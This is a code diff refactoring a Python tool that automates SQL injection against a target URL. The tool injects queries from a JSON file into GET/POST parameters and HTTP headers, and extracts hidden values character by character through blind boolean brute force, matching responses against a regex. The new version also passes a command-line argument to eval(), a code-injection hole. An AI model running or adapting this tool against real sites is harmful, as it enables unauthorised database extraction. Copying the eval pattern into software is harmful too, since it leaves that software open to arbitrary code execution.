@@ -14,34 +14,24 @@ verbose = False
 cli = cli_options.CliOptions()
 
 
-def createBruteQuery(word, query):
-    brutequery = query.format(word)
-
-    return brutequery
-
-
-def createWord(word, char):
-    return word + char
-
-
-def substitutePlaceholders(query, placeholder, notin):
+def substitute_placeholders(query, placeholder, notin):
     notinString = ','.join([("'" + name + "'") for name in notin])
     query = re.sub(placeholder, notinString, query)
 
     return query
 
 
-def inPOSTrequest(payload, url, headers):
+def in_POST_request(payload, url, headers):
     r = requests.post(url, data=payload, headers=headers)
     return (r.text, r.status_code)
 
 
-def inGETrequest(payload, url, headers):
+def in_GET_request(payload, url, headers):
     r = requests.get(url, params=payload, headers=headers)
     return (r.text, r.status_code)
 
 
-def preparePayload(parameters, phrase, encode):
+def prepare_payload(parameters, phrase, encode):
     payload = {}
 
     for param in parameters:
@@ -58,9 +48,10 @@ def preparePayload(parameters, phrase, encode):
     return payload
 
 
-def notBruteForce(parameters, headers, phrase, url, callback, pattern, positive, encode):
+def not_bruteforce(parameters, headers, sql_query, url, callback, pattern, positive, encode):
 
-    payload = preparePayload(parameters, phrase, encode)
+    payload = prepare_payload(parameters, sql_query, encode)
+    headers = prepare_payload(headers, sql_query, encode)
     r, status = callback(payload, url, headers)
     if verbose: print('[Response body] {}'.format(cli.grey(r)))
     if verbose: print("[Http status] {}".format(cli.status(status)))
@@ -68,35 +59,41 @@ def notBruteForce(parameters, headers, phrase, url, callback, pattern, positive,
     result = pattern.search(r)
 
     if (positive and result) or (not positive and not result):
-        message = '[Found] {}'.format(phrase)
+        message = '[Found] {}'.format(r)
         print(cli.green(message))
 
 
-def bruteforce(parameters, headers, phrase, url, callback, pattern, positive, encode, word=''):
+def bruteforce(parameters, headers, sql_query, url, callback, pattern, positive, encode, word=''):
 
-    for char in chars:
+    try:
 
-        newWord = createWord(word, char)
-        brutequery = createBruteQuery(newWord, phrase)
-        if verbose: print('[Payload] {}'.format(cli.grey(brutequery)))
-        payload = preparePayload(parameters, brutequery, encode)
-        newHeaders = preparePayload(headers, brutequery, encode)
+        for char in chars:
 
-        r, status = callback(payload, url, newHeaders)
-        if verbose: print('[Response body] {}'.format(cli.grey(r)))
-        if verbose: print("[Http status] {}".format(cli.status(status)))
+            new_word = word + char
+            brutequery = sql_query.format(new_word)
+            if verbose: print('[Payload] {}'.format(cli.grey(brutequery)))
 
-        result = pattern.search(r)
+            payload = prepare_payload(parameters, brutequery, encode)
+            new_headers = prepare_payload(headers, brutequery, encode)
 
-        if (positive and result) or (not positive and not result):
-                return bruteforce(parameters, headers, phrase, url, callback, pattern, positive, encode, newWord)
+            r, status = callback(payload, url, new_headers)
+            if verbose: print('[Response body] {}'.format(cli.grey(r)))
+            if verbose: print("[Http status] {}".format(cli.status(status)))
 
-    message = cli.green('[Found] {}'.format(word)) if word is not '' else cli.red('[Nothing found] :(')
-    print(message)
-    return word
+            result = pattern.search(r)
+
+            if (positive and result) or (not positive and not result):
+                    return bruteforce(parameters, headers, sql_query, url, callback, pattern, positive, encode, new_word)
+
+        message = cli.green('[Found] {}'.format(word)) if word is not '' else cli.red('[Nothing found] :(')
+        print(message)
+        return word
+
+    except KeyboardInterrupt:
+        print(cli.red('\n[Script exit]'))
 
 
-def parseParameters(params, delimiter):
+def parse_parameters(params, delimiter):
     paramsAsList = []
     if params:
         for param in params:
@@ -104,33 +101,20 @@ def parseParameters(params, delimiter):
     return paramsAsList
 
 
-def runInjection(method, parameters, headers, phrasesToTest, url, pattern, positive, encode):
+def run_injection(method, parameters, headers, sql_query_set, url, pattern, positive, encode):
+    try:
+        if type(sql_query_set) is list:
+            for phrase in sql_query_set:
+                run_with_callback(method, parameters, headers, phrase, url, pattern, positive, encode)
 
-    func = notBruteForce
+        elif type(sql_query_set) is str:
+            run_with_callback(method, parameters, headers, sql_query_set, url, pattern, positive, encode)
 
-    for phrase in phrasesToTest:
+    except KeyboardInterrupt:
+        print(cli.red('\n[Script exit]'))
 
-        if not re.search(PLACEHOLDER, phrase):
-            func = notBruteForce
-        else:
-            func = bruteforce
-
-        phrase = substitutePlaceholders(phrase, NOTIN_PLACEHOLDER, notin)
-        phrase = phrase.rstrip('\n')
-        print(cli.yellow('\n[Testing] {}'.format(phrase)))
-
-        try:
-
-            if method == 'POST':
-                func(parameters, headers, phrase, url, inPOSTrequest, pattern, positive, encode)
-
-            elif method == 'GET':
-                func(parameters, headers, phrase, url, inGETrequest, pattern, positive, encode)
-
-        except KeyboardInterrupt:
-            print(cli.red('\n[Script exit]'))
-        except:
-            print('''
+    except:
+        print('''
             Something went wrong. Possible causes:
             1. Wrong regexp pattern
             2. Negative search pattern is actually positive search pattern
@@ -139,14 +123,36 @@ def runInjection(method, parameters, headers, phrasesToTest, url, pattern, posit
             ''')
 
 
+def run_with_callback(method, parameters, headers, sql_query, url, pattern, positive, encode):
+
+    if not re.search(PLACEHOLDER, sql_query):
+        func = not_bruteforce
+
+    else:
+        func = bruteforce
+
+    sql_query = substitute_placeholders(sql_query, NOTIN_PLACEHOLDER, notin)
+    sql_query = sql_query.rstrip('\n')
+    print(cli.yellow('\n[Testing] {}'.format(sql_query)))
+
+    if method == 'POST':
+        func(parameters, headers, sql_query, url, in_POST_request, pattern, positive, encode)
+
+    elif method == 'GET':
+        func(parameters, headers, sql_query, url, in_GET_request, pattern, positive, encode)
+
+
+
+
 if __name__ == "__main__":
 
-    args = cli.parseArguments()
+    args = cli.parse_arguments()
     
-    jsonParsed = json.load(args.filename)
+    json_parsed = json.load(args.filename)
+    query_set = eval('json_parsed'+args.query_set)
 
-    headers = parseParameters(args.http_header, ':')
-    parameters = parseParameters(args.parameter, '=')
+    headers = parse_parameters(args.http_header, ':')
+    parameters = parse_parameters(args.parameter, '=')
     verbose = args.verbose
 
-    runInjection(args.http_method, parameters, headers, jsonParsed[args.query_set], args.url, pattern= re.compile(args.pattern), encode=args.encode, positive=args.positive)
+    run_injection(args.http_method, parameters, headers, query_set, args.url, pattern= re.compile(args.pattern), encode=args.encode, positive=args.positive)
